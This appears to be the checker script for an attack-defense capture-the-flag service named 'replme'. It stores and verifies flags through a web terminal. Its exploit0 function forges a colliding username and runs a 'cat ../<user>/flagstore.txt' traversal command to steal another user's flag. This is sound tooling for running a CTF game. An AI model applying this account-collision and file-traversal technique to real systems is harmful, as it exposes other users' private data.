import secrets
import re
from logging import LoggerAdapter

from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import assert_equals
from httpx import AsyncClient
import base64

from exploit import exploit0_apply_delta
from noise import get_noise, get_random_noise
from util import (
    do_user_auth,
    get_sessions,
    sh,
    terminal_websocket,
    user_create,
    user_login,
)

checker = Enochecker("replme", 6969)


def app():
    return checker.app


@checker.putflag(0)
async def putflag0(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    (username, cookies, id) = await user_create(client, db, logger)
    flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8")
    await terminal_websocket(
        task.address,
        logger,
        cookies,
        id,
        [sh(f'echo "{flag}" > flagstore.txt').default()],
    )

    return username


@checker.getflag(0)
async def getflag0(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    (cookies, id) = await user_login(client, db, logger)
    flag = (
        base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8").replace("+", "\\+")
    )
    try:
        await terminal_websocket(
            task.address,
            logger,
            cookies,
            id,
            [sh("cat flagstore.txt").expect(f".*\n{flag}.*").errext()],
        )
    except TimeoutError:
        raise MumbleException("Flag was not found")


@checker.exploit(0)
async def exploit0(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    target_username = task.attack_info

    if target_username is None:
        raise MumbleException("No attack_info")

    logger.info("Exploit: " + target_username)

    if len(target_username) != 60:
        raise MumbleException("Incorrect attack_info username length")

    delta_username = exploit0_apply_delta(target_username)

    logger.info("Delta username: " + delta_username)

    password = secrets.token_hex(30)

    (cookies, id) = await do_user_auth(client, logger, delta_username, password)
    response = await terminal_websocket(
        task.address,
        logger,
        cookies,
        id,
        [sh(f"echo FLAG && cat ../{target_username}/flagstore.txt").default()],
    )

    match = re.findall(r"FLAG\s*([A-Za-z0-9\+\=\/]+)\s*OK", response)
    if len(match) == 0:
        return None

    flag = base64.b64decode(match[0]).decode("utf-8")
    return flag


@checker.putnoise(0)
async def putnoise0(
    task: PutnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    (_, cookies, id) = await user_create(client, db, logger)
    sessions = await get_sessions(client, cookies, logger)
    assert_equals(len(sessions) > 0, True, "No session created")

    (i, noise) = get_random_noise()
    await terminal_websocket(
        task.address,
        logger,
        cookies,
        id,
        noise.command_chain,
    )

    await db.set("noise_id", i)


@checker.getnoise(0)
async def getnoise0(
    task: GetnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    (cookies, id) = await user_login(client, db, logger)
    sessions = await get_sessions(client, cookies, logger)
    assert_equals(len(sessions) > 0, True, "No session created")
    try:
        i = await db.get("noise_id")
    except KeyError:
        raise MumbleException("noise_id not present in chaindb")
    if not isinstance(i, int):
        raise MumbleException("noise_id is not a int: " + str(i))
    noise = get_noise(i)
    await terminal_websocket(
        task.address,
        logger,
        cookies,
        id,
        noise.validation_chain,
    )


@checker.havoc(0)
async def havoc0(
    task: HavocCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    response = await client.get("/", follow_redirects=True)
    assert_equals(
        response.status_code < 300,
        True,
        "Failed to get index.html",
    )

    assert_equals(
        (await client.get("/favicon.ico", follow_redirects=True)).status_code < 300,
        True,
        "Failed to get favicon.ico",
    )

    pattern = r'[href|src]="(/[^"]*)"'
    matches = re.findall(pattern, response.text)
    for match in matches:
        if isinstance(match, str) and match.startswith("/_next/static"):
            assert_equals(
                (await client.get(match, follow_redirects=True)).status_code < 300,
                True,
                "Failed to get " + match,
            )


if __name__ == "__main__":
    checker.run()
